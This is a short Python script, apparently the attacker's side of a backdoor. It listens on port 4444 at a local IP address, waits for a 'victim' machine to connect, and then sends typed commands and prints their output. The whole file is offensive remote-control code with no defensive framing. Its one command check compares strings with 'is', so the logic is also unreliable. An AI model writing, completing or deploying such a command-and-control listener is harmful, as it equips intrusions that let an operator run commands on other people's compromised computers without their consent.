import os
import socket
my_ip = '192.168.1.71'
port = 4444
s = socket.socket()
s.bind((my_ip, port))
print('[+] Server Started')
print('[+] Listening For Victim')
s.listen(1)
conn, addr = s.accept()
print("[+]" ,addr," Victim opened the backdoor")

while(1):
        print("")
        command=input(str("Command >> "))
        #command="cwd"
        if command is "cwd":
                conn.send(command.encode())
                print("")
                print("Command sent, Waiting for execution")
                print("")
                files=conn.recv(5000)
                files=files.decode()
                print("Command Output: ",files)
        else:
                print("")
                print("Command not recognised")

